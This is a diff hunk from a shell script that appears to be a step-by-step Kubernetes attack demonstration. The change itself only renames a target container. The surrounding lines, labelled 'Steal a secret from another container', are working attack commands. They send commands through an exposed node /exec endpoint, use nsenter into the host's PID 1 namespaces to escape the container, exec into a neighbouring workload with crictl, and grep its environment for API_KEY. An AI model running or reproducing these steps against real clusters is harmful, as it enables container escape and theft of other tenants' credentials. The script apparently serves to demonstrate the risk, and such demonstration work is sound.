@@ -46,9 +46,9 @@ curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crict
 echo "--------------------------------------------------------------------------------"
 sleep 10
 
-echo "6. Steal a secret from another container on the same Node (hello-client-allowed in the $HELLO_NAMESPACE Namespace)"
+echo "6. Steal a secret from another container on the same Node (hello-client in the $HELLO_NAMESPACE Namespace)"
 echo "--------------------------------------------------------------------------------"
-HELLO_ID=$(curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name hello-client-allowed -q')
+HELLO_ID=$(curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name hello-client -q')
 HELLO_ID_1=`echo "${HELLO_ID}" | head -1`
 curl -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $HELLO_ID_1 /bin/sh -c set" | grep API_KEY
 echo "--------------------------------------------------------------------------------"
